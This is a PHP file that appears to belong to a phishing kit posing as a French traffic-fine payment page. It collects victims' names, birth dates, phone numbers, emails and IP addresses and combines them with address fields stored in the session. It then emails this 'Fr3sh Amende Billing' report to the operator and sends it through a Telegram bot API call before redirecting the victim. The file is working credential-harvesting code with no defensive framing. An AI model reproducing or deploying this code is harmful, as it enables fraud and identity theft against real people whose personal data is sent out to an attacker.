<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$name = $_POST['prenom'] . " " . $_POST['nom'];
$ddn = $_POST['ddn'];
$phone = $_POST['tel'];
$email = $_POST['email'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['name'] = htmlspecialchars($name);
    $_SESSION['ddn'] = htmlspecialchars($ddn);
    $_SESSION['phone'] = htmlspecialchars($phone);
    $_SESSION['email'] = htmlspecialchars($email);

$message = '
[🦊] Amende Billing [🦊]
 
📞 Nom : '.$_SESSION['name'].'
📞 Date de naissance : '.$_SESSION['ddn'].'
📞 Adresse : '.$_SESSION['adresse'].'
📞 Code Postale : '.$_SESSION['zipcode'].'
📞 Ville : '.$_SESSION['city'].'

📱 Téléphone : '.$_SESSION['phone'].'

💌 Email : '.$_SESSION['email'].'

🚩 Pays : France
    
🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

    if($mail_send == true){
      $Subject=" 「🍓」+1 Fr3sh Amende Billing from ".$_SESSION['name']." | ".$_SERVER['REMOTE_ADDR'];
      $head="From: Amende <info@INUN.bg>";
      
      mail($rezmail,$Subject,$message,$head);
      }
      
      if($tlg_send == true){
          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=".$rez_chat."&text=".urlencode("$message"));
      }

    header('Location: ../loading.php');

}
?>